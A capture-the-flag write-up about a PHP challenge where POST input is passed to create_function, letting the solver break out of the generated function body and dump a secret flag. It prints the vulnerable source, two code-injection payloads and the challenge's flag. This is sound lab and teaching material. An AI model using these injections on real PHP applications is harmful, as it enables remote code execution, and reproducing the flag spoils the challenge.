```PHP
<?php  
...
  
$success = '  
<div class="alert alert-success alert-dismissible" role="alert">  
    <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>    Function declared.</div>  
';  
  
include "flag.php";  
  
if (isset ($_POST['c']) && !empty ($_POST['c'])) {  
    $fun = create_function('$flag', $_POST['c']);  
    print($success);  
    //fun($flag);  
    if (isset($_POST['q']) && $_POST['q'] == 'checked') {  
        die();  
    }  
}  
?>
```

It's creating a lambda with the flag as an arugment, and our input as the code.

Reading the docs for `create_function` you see:
> **Caution**
> This function internally performs an [eval()](https://devdocs.io/php/function.eval) and as such has the same security issues as [eval()](https://devdocs.io/php/function.eval). It also has bad performance and memory usage characteristics, because the created functions are global and can not be freed.
> 
> A native [anonymous function](https://devdocs.io/php/functions.anonymous) should be used instead.

Source code:
```PHP
    function create_function($args, $code)
    {
        if (PHP_MAJOR_VERSION <= 7) {
            return @\create_function($args, $code);
        }

        static $i;

        $namespace = __NAMESPACE__;

        do {
            $i++;
            $name = "__{$namespace}_lambda_{$i}";
        } while (\function_exists($name));

        eval("function {$name}({$args}) { {$code} }");

        return $name;
    }
}
```
This means we can close the expected function code ourselves with `}` and then run code outside the function, still being evaluated. We just need to make sure we close the squiggly brackets
```PHP
whatever();} var_dump($flag); {
```
Reading up later online about this, I found this on  [ExploitDB](https://www.exploit-db.com/exploits/32417), which entails we can just comment out the squiggly bracket with:
```PHP
whatever();} var_dump($flag);/*
```

# Solution
```
WEBSEC{HHVM_was_right_about_not_implementing_eval}
```